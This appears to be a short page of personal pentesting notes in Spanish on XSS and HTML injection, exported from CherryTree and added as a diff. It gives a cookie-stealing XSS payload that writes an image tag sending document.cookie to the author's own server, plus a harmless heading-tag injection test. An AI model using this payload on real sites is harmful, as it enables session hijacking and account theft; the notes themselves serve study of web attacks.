@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>XSS y HTML Injection</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>XSS y HTML Injection</h1><br/><strong><span style="text-decoration:underline;">XSS</span></strong><br /><br />A traves de una textbox por ejemplo en una web podremos introducir codigo Javascript y el servidor lo interpretara<br /><br /><span style="color:#d50cbb;">&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://127.0.0.1/imagen.jpg?=&#39; + document.cookie + &#39; &quot;&gt;&#39;)&lt;/script&gt;</span><br /><br />Con este script lo que haremos es enviar a nuestro servidor un log el cual nos indicara la cookie de session<br /><br /><strong><span style="text-decoration:underline;">HTML INJECTION</span></strong><br /><br />A traves de una textbox por ejemplo en una web podremos introducir etiquetas HTML y el servidor nos las interpretara<br /><br /><span style="color:#d50cbb;">&lt;h1&gt;Prueba&lt;/h1&gt;</span><br /><br />Si introducieramos lo anterior y el servidor estuviera mal sanitizado, veriamos el texto como si fuera un titulo<br /><br /><br /><br /><br /><a href="Explotacion.html">Volver al indice</a></div>
+</body>
+</html>
